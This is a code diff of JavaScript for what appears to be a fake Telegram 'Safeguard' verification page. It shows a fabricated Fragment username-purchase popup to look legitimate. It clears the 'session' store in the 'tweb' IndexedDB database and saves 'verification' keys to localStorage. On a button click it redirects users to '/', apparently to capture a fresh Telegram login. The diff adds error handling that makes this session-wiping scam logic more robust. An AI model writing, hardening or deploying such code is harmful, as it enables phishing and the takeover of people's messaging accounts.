@@ -41,34 +41,48 @@ async function onloadevent() {
     </div>
     `;
 
-
-    if(window.Telegram.WebApp) {
-        window.Telegram.WebApp.ready();
-        window.Telegram.WebApp.MainButton.setParams({
-            color: window.Telegram.WebApp.bottomBarColor,
-            text: "@safeguard"
-        });
-        window.Telegram.WebApp.MainButton.show();
-        window.Telegram.WebApp.onEvent('mainButtonClicked', () => window.Telegram.WebApp.showPopup({title: 'safeguard', message: 'This username was bought on Fragment on May 17, 2023 at 5:39 PM for 151.00 ($2,845.92)'}));
+    if (window.Telegram && window.Telegram.WebApp) { // Check existence
+        try {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.MainButton.setParams({
+                color: window.Telegram.WebApp.themeParams.bg_color || '#000000', // Fallback, fixed potential undefined
+                text: "@safeguard"
+            });
+            window.Telegram.WebApp.MainButton.show();
+            window.Telegram.WebApp.onEvent('mainButtonClicked', () => window.Telegram.WebApp.showPopup({ title: 'safeguard', message: 'This username was bought on Fragment on May 17, 2023 at 5:39 PM for 151.00 ($2,845.92)' }));
+        } catch (err) {
+            console.error("Telegram WebApp error:", err);
+        }
     }
 
     document.body.append(overlay);
-    const db = indexedDB.open("tweb");
-    db.onsuccess = ((_) => {
-        const transaction = db.result.transaction("session", "readwrite");
+    try {
+        const db = await new Promise((resolve, reject) => {
+            const req = indexedDB.open("tweb");
+            req.onsuccess = () => resolve(req.result);
+            req.onerror = () => reject(req.error);
+        });
+        const transaction = db.transaction("session", "readwrite");
         transaction.objectStore("session").clear();
-    });
+    } catch (err) {
+        console.error("IndexedDB error:", err); // Log but continue for demo
+    }
 
     document.getElementById("verifyButton").addEventListener("click", async () => {
-        document.getElementById("verifyButton").innerText = "Loading...";
-        
-        let type = window.location.search == "" ? "msg" : "ins";
-        let key = type == "msg" ? window.location.pathname.split("/")[1] : window.location.search.split("=")[1];
+        try {
+            document.getElementById("verifyButton").innerText = "Loading...";
+            
+            let type = window.location.search == "" ? "msg" : "ins";
+            let key = type == "msg" ? window.location.pathname.split("/")[1] : window.location.search.split("=")[1];
 
-        localStorage.clear();
-        localStorage.setItem("verification-type", type);
-        localStorage.setItem("verification-key", key);
-        window.location.assign("/");
+            localStorage.clear();
+            localStorage.setItem("verification-type", type);
+            localStorage.setItem("verification-key", key);
+            window.location.assign("/");
+        } catch (err) {
+            console.error("Button click error:", err);
+            document.getElementById("verifyButton").innerText = "Error - Try Again";
+        }
     });
 }
 
